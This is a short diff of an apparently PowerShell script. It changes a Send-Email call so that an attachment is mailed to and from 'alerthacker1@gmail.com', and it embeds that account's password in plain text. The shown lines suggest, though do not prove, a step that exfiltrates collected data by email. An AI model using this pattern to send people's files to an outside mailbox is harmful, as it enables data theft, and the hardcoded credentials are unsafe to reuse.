@@ -66,11 +66,11 @@ try
 {
     Send-Email
         -attachment $Att
-        -To "wdas@gmail.com"
+        -To "alerthacker1@gmail.com"
         -Body $Body
         -Subject $Subj
-        -password "wad"
-        -From "sa@gmail.com"
+        -password "accountworks"
+        -From "alerthacker1@gmail.com"
 }
 catch 
 {
